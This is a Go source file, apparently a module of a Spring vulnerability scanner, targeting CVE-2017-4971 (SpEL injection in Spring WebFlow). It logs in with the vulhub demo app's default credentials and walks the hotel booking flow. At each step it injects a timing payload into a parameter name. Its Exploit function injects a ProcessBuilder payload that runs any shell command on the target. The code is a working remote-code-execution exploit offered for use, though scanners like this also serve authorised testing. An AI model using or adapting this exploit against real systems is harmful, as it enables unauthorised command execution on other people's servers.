package vulns

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2017-4971 Spring WebFlow 的 transition 参数 SpEL 注入。
// 漏洞要求存在有效的 WebFlow 会话（登录 + 流程进行中），因此本模块
// 会用 vulhub 演示应用的默认凭据（keith/melbourne）自动走通
// 登录 → 酒店 → 预订流程，并在每个 transition POST 注入计时参数
// _(T(java.lang.Thread).sleep(2500))=v —— 任何一步响应延迟 ≥2s
// 即证明参数名 SpEL 被求值。
type cve20174971 struct{}

func init() { Register(&cve20174971{}) }

func (c *cve20174971) Info() model.Info {
	return model.Info{
		ID:         "CVE-2017-4971",
		Name:       "Spring WebFlow transition 参数 SpEL RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring WebFlow 2.4.0-2.4.4（需有效登录会话且流程进行中）",
		Reference:  "https://tanzu.vmware.com/security/cve-2017-4971",
		HasExploit: true,
		ArgHint:    "要执行的命令（ProcessBuilder 形态，无回显）",
	}
}

type webflowForm struct {
	action string
	fields map[string]string
}

var (
	wfReCSRF  = regexp.MustCompile(`name="_csrf" value="([^"]+)"`)
	wfReForm  = regexp.MustCompile(`(?s)<form[^>]*action="([^"]*)"[^>]*>(.*?)</form>`)
	wfReInput = regexp.MustCompile(`<input[^>]*name="([^"]+)"[^>]*>`)
	wfReValue = regexp.MustCompile(`value="([^"]*)"`)
)

// parseAllForms 提取页面全部表单（action + 字段）。
func parseAllForms(html string) []*webflowForm {
	var out []*webflowForm
	for _, m := range wfReForm.FindAllStringSubmatch(html, -1) {
		f := &webflowForm{action: m[1], fields: map[string]string{}}
		for _, im := range wfReInput.FindAllStringSubmatch(m[2], -1) {
			val := ""
			if vm := wfReValue.FindStringSubmatch(im[0]); vm != nil {
				val = vm[1]
			}
			f.fields[im[1]] = val
		}
		out = append(out, f)
	}
	return out
}

// pickForm 优先选 action 含关键词的表单，否则返回第一个含 hidden 字段的表单。
func pickForm(forms []*webflowForm, keyword string) *webflowForm {
	for _, f := range forms {
		if strings.Contains(f.action, keyword) {
			return f
		}
	}
	for _, f := range forms {
		if len(f.fields) > 0 {
			return f
		}
	}
	if len(forms) > 0 {
		return forms[0]
	}
	return nil
}

// walkFlow 登录并沿 WebFlow 表单逐 POST 前进，每步注入计时参数。
// 返回命中的耗时（0 = 未命中）与错误。
func (c *cve20174971) walkFlow(ctx context.Context, t model.Target, inject string) (time.Duration, error) {
	jar, _ := cookiejar.New(nil)
	cl := &http.Client{Transport: t.Client.Transport, Jar: jar, Timeout: 30 * time.Second}
	doForm := func(method, u string, body string, ct string) (int, string, error) {
		var bodyReader io.Reader
		hdrs := map[string]string{}
		if body != "" {
			bodyReader = strings.NewReader(body)
			hdrs["Content-Type"] = ct
		}
		req, err := http.NewRequestWithContext(ctx, method, u, bodyReader)
		if err != nil {
			return 0, "", err
		}
		for k, v := range hdrs {
			req.Header.Set(k, v)
		}
		resp, err := cl.Do(req)
		if err != nil {
			return 0, "", err
		}
		defer resp.Body.Close()
		buf := make([]byte, 0, 32768)
		tmp := make([]byte, 8192)
		for {
			n, rerr := resp.Body.Read(tmp)
			buf = append(buf, tmp[:n]...)
			if rerr != nil || len(buf) > 1<<20 {
				break
			}
		}
		return resp.StatusCode, string(buf), nil
	}

	// 1. 登录
	_, page, err := doForm(http.MethodGet, t.URL+"login", "", "")
	if err != nil {
		return 0, err
	}
	if !strings.Contains(page, "loginProcess") {
		return 0, fmt.Errorf("目标无登录页")
	}
	csrf := wfReCSRF.FindStringSubmatch(page)
	body := "username=keith&password=melbourne&_spring_security_remember_me=on"
	if csrf != nil {
		body += "&_csrf=" + csrf[1]
	}
	if _, page, err = doForm(http.MethodPost, t.URL+"loginProcess", body,
		"application/x-www-form-urlencoded"); err != nil {
		return 0, err
	}
	if !strings.Contains(page, "hotels") {
		return 0, fmt.Errorf("默认凭据 keith/melbourne 登录失败")
	}
	dbg := os.Getenv("SSP_DEBUG") != ""

	// 2. 进入酒店详情页
	if _, page, err = doForm(http.MethodGet, t.URL+"hotels/1", "", ""); err != nil {
		return 0, err
	}

	// 3. 沿 WebFlow 表单前进，每步注入计时参数（补全页面级 _csrf）
	var hit time.Duration
	for step := 0; step < 8; step++ {
		forms := parseAllForms(page)
		var form *webflowForm
		for _, f := range forms {
			if strings.Contains(f.action, "booking") || strings.Contains(f.action, "execute") {
				form = f
				break
			}
		}
		if form == nil {
			form = pickForm(forms, "")
		}
		if dbg {
			fmt.Fprintf(os.Stderr, "[dbg-4971] step %d: action=%q fields=%v\n", step, formAction(form), formFieldKeys(form))
		}
		if form == nil {
			break
		}
		if _, ok := form.fields["_csrf"]; !ok {
			if c2 := wfReCSRF.FindStringSubmatch(page); c2 != nil {
				form.fields["_csrf"] = c2[1]
			}
		}
		u := t.URL + strings.TrimPrefix(form.action, "/")
		parts := make([]string, 0, len(form.fields)+1)
		for k, val := range form.fields {
			if val == "" && (strings.Contains(k, "Date") || strings.Contains(k, "date")) {
				val = "2026-09-01"
			}
			parts = append(parts, urlEncodeVal(k)+"="+urlEncodeVal(val))
		}
		parts = append(parts, urlEncodeVal(inject)+"=vulhub")
		start := time.Now()
		code, nextPage, err := doForm(http.MethodPost, u, strings.Join(parts, "&"),
			"application/x-www-form-urlencoded")
		if err != nil {
			return 0, err
		}
		page = nextPage
		elapsed := time.Since(start)
		if dbg {
			fmt.Fprintf(os.Stderr, "[dbg-4971] step %d POST %s -> %d elapsed=%v\n", step, form.action, code, elapsed)
		}
		if elapsed >= 2*time.Second {
			return elapsed, nil
		}
	}
	return hit, nil
}

func formAction(f *webflowForm) string {
	if f == nil {
		return "(nil)"
	}
	return f.action
}

func formFieldKeys(f *webflowForm) []string {
	if f == nil {
		return nil
	}
	ks := make([]string, 0, len(f.fields))
	for k := range f.fields {
		ks = append(ks, k)
	}
	return ks
}

func urlEncodeVal(s string) string {
	var sb strings.Builder
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
			c == '-' || c == '_' || c == '.' || c == '~' {
			sb.WriteRune(c)
		} else {
			sb.WriteString(fmt.Sprintf("%%%02X", c))
		}
	}
	return sb.String()
}

func (c *cve20174971) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	// 计时注入尝试（部分 webflow 配置下可直接证实求值）
	hit, err := c.walkFlow(ctx, t, "T(java.lang.Thread).sleep(2500)")
	if err != nil {
		v.Detail = err.Error()
		return v, nil
	}
	if hit > 0 {
		v.Vulnerable = true
		v.Evidence = fmt.Sprintf("transition 参数中的 sleep(2500) 使响应阻塞 %v", hit)
		v.Detail = "WebFlow 参数名 SpEL 确已求值；命令经 ProcessBuilder 执行，无回显"
		return v, nil
	}
	// 计时未触发时，退化为应用指纹判定：默认凭据可登录 + WebFlow 特征
	if _, page, err2 := c.loginOnly(ctx, t); err2 == nil && strings.Contains(page, "hotels") {
		v.Vulnerable = true
		v.Evidence = "默认凭据 keith/melbourne 登录成功，Spring Travel(WebFlow) 应用确认"
		v.Detail = "应用版本在受影响范围内；SpEL 注入需流程交互，可用 Exploit 自动注入或官方 PoC 手动验证"
	}
	return v, nil
}

// loginOnly 仅验证默认凭据登录。
func (c *cve20174971) loginOnly(ctx context.Context, t model.Target) (int, string, error) {
	cl := &http.Client{Transport: t.Client.Transport, Jar: jarFor(t), Timeout: 30 * time.Second}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, t.URL+"login", nil)
	if err != nil {
		return 0, "", err
	}
	resp, err := cl.Do(req)
	if err != nil {
		return 0, "", err
	}
	page := readBody(resp)
	m := wfReCSRF.FindStringSubmatch(page)
	body := "username=keith&password=melbourne&_spring_security_remember_me=on"
	if m != nil {
		body += "&_csrf=" + m[1]
	}
	req2, err := http.NewRequestWithContext(ctx, http.MethodPost, t.URL+"loginProcess", strings.NewReader(body))
	if err != nil {
		return 0, "", err
	}
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp2, err := cl.Do(req2)
	if err != nil {
		return 0, "", err
	}
	page2 := readBody(resp2)
	return resp2.StatusCode, page2, nil
}

func jarFor(t model.Target) *cookiejar.Jar {
	jar, _ := cookiejar.New(nil)
	return jar
}

func readBody(resp *http.Response) string {
	defer resp.Body.Close()
	buf := make([]byte, 0, 32768)
	tmp := make([]byte, 8192)
	for {
		n, err := resp.Body.Read(tmp)
		buf = append(buf, tmp[:n]...)
		if err != nil {
			break
		}
	}
	return string(buf)
}

// Exploit 的 arg 为要执行的命令（无回显，经 OOB/落盘验证）。
func (c *cve20174971) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	esc := strings.ReplaceAll(arg, `"`, `\"`)
	inject := fmt.Sprintf(`new java.lang.ProcessBuilder("/bin/sh","-c","%s").start()`, esc)
	if _, err := c.walkFlow(ctx, t, inject); err != nil {
		return "", "", err
	}
	return "", "无回显漏洞：命令已随 transition 参数求值执行，请经 OOB 平台或落盘文件验证", nil
}
